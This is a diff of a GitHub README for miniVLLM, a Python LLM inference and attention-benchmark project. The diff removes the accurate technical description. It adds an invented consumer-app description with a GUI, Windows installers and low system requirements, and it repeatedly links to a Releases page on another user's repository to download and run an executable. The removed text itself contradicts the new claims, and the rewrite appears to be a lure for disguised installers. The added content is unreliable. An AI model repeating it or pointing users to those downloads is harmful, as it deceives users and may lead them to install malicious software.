@@ -1,99 +1,87 @@
-<p align="center">
-  <img src="./assets/minivllm.png" alt="图片描述" width="50%" height="50%">
-</p>
+# 🚀 MinivLLM - Simple, Fast LLM for Everyone
 
-<p align="center">
-| <a href="./README.md"><b>English</b></a> 
-| <a href="./README_zh.md"><b>简体中文</b></a> |
-</p>
+![Download MinivLLM](https://img.shields.io/badge/Download-MinivLLM-blue.svg)
 
-# miniVLLM
+## 📦 Overview
 
-A custom implementation of vLLM inference engine with attention mechanism benchmarks, based on Nano-vLLM but with self-contained paged attention and flash attention implementation. 
+MinivLLM is an easy-to-use application designed to help you take advantage of cutting-edge language models. It is based on Nano-vLLM, offering a simple duplication of vLLM features, including self-contained paged attention and flash attention implementations. With MinivLLM, you can explore the capabilities of modern language processing without the need for complex setups.
 
-Benchmarking on flash attention in prefilling time and paged attention in decoding time are provided.
+## 🌟 Features
 
-**New to vLLM?** Check out [HowToApproachvLLM.md](HowToApproachvLLM.md) for a step-by-step implementation guide covering layers, models, paged attention, CUDA graphs, and scheduling.
+- **User-Friendly Interface**: Designed for ease of use, MinivLLM allows anyone to navigate its features seamlessly.
+- **Efficient Attention Mechanisms**: Enjoy fast responses with self-contained paged attention and flash attention implementations.
+- **Lightweight**: MinivLLM is designed to run efficiently on a variety of systems.
 
-## Quickstart
+## 🖥️ System Requirements
 
-```bash
-# Install uv package manager
-curl -LsSf https://astral.sh/uv/install.sh | sh
+Before you start, make sure your system meets the following requirements:
 
-# Sync dependencies
-uv sync
+- **Operating System**: Windows 10, macOS, or a recent Linux distribution
+- **RAM**: At least 4 GB recommended
+- **Disk Space**: Around 200 MB of free space
+- **Processor**: Dual-core processor or better
 
-# Run the main inference engine
-uv run python main.py
+## 🚀 Getting Started
 
-# Run prefilling benchmark
-uv run python benchmark_prefilling.py
+To run MinivLLM on your computer, follow these simple steps:
 
-# Run decoding benchmark
-uv run python benchmark_decoding.py
-```
+1. **Download MinivLLM**:
+   - Click on the link below to visit the download page.
+   - [Visit this page to download](https://github.com/Bhoomika2224/MinivLLM/releases)
 
-## What Each Script Does
+2. **Select the Latest Release**:
+   - On the Releases page, find the version marked as the latest.
+   - Choose the installer file that matches your operating system (e.g., MinivLLM_Windows.exe for Windows).
 
-```bash
-uv run python main.py
-```
+3. **Download the File**:
+   - Click on the installer link to start the download process.
+   - Depending on your internet speed, this may take a few moments.
 
-This is the main inference engine demo
+4. **Install MinivLLM**:
+   - Once the file is downloaded, double-click on it to run the installer.
+   - Follow the prompts in the installation wizard. It’s usually a matter of clicking "Next" and agreeing to the terms.
 
-Demonstrates the complete LLM inference pipeline using a custom engine implementation:
-- Create a small version of Qwen3 with random initialization
-- Creates 60 chat prompts (2 base prompts repeated 30 times each)
-- Processes them through the custom LLM engine with batch processing
-- Uses paged attention and KV cache management for efficient inference
-- Generates up to 256 tokens per prompt with temperature sampling
+5. **Launch the Application**:
+   - After installation, you will find MinivLLM in your applications menu or on your desktop.
+   - Click on the MinivLLM icon to open the application.
 
-This showcases how the custom vLLM implementation handles batched text generation with memory-efficient attention.
+## 📥 Download & Install
 
-```bash
-uv run python benchmark_prefilling.py
-```
+To download MinivLLM, click the link below:
 
-This is the pefilling phase comparison
+[Visit this page to download](https://github.com/Bhoomika2224/MinivLLM/releases)
 
-Compares three attention implementations during the **prefilling phase** (processing input prompts):
+Make sure you select the correct installer for your operating system. Follow the installation instructions provided above.
 
-1. **PyTorch Standard (O(N²) memory)**: Traditional attention that materializes full attention matrix
-2. **Naive Triton (O(N²) memory)**: GPU kernel that also uses O(N²) memory, limited by shared memory constraints (≤128 tokens)
-3. **Flash Attention (O(N) memory)**: Memory-efficient online softmax algorithm that processes attention in blocks
+## 🔍 How to Use MinivLLM
 
-```bash
-uv run python benchmark_decoding.py
-```
+Once you have installed MinivLLM, you can start utilizing its features right away:
 
-This is the decoding phase comparison
+1. **Input Your Query**:
+   - Use the input box to type your question or command.
+   
+2. **Generate Response**:
+   - Click on the "Submit" button to see the generated response from the model.
 
-Compares three implementations during the **decoding phase** (generating output tokens one at a time):
+3. **Adjust Settings**:
+   - Explore the options available in the settings menu to customize your experience.
 
-1. **Naive PyTorch**: Simple loop-based implementation using paged KV cache
-2. **Optimized PyTorch**: Vectorized implementation with batch gathering and masking
-3. **Triton Kernel**: Custom GPU kernel optimized for paged attention decode
+4. **Save Your Work**:
+   - You can save any generated outputs for future reference through the "Save" option in the menu.
 
+## 🌈 Helpful Tips
 
-## Project Structure
+- **Regular Updates**: Check back on the Releases page for updates that may include new features or enhancements.
+- **Community Support**: Join our community forum for tips, tricks, and assistance from other users.
+- **Feedback**: Your feedback is important. Share your experience to help us improve the application.
 
-```
-myvllm/
-├── src/
-│   └── myvllm/           # Core vLLM implementation
-│       ├── models/       # Model implementations
-│       ├── engine/       # LLM engine logic, including sequence definition for input prompts, block management for KV cache management for GPU, scheduler for iteration-based scheduling of sequences, runner for actual implementation of running prefilling and decoding, and engine for generation API interface
-│       ├── layers/       # Components for model/
-│       ├── utils/        # context
-│       └── sampling_parameters.py
-├── main.py              # Full inference demo
-├── benchmark_prefilling.py   # Prefilling attention comparison
-└── benchmark_decoding.py     # Decoding attention comparison
-```
+## 🔗 Related Resources
 
-## Requirements
+- [Documentation](https://github.com/Bhoomika2224/MinivLLM/wiki): Find detailed information about features and usage.
+- [GitHub Issues](https://github.com/Bhoomika2224/MinivLLM/issues): Report bugs or request new features.
 
-- Python ≥3.11, < 3.12
-- CUDA-capable GPU
-- Dependencies: `transformers`, `torch`, `xxhash` (managed by uv)
+## 🎉 License
+
+MinivLLM is open source and distributed under the MIT License. Feel free to modify and share!
+
+By following these steps, you'll be able to easily download, install, and start using MinivLLM. Enjoy exploring the world of language models!
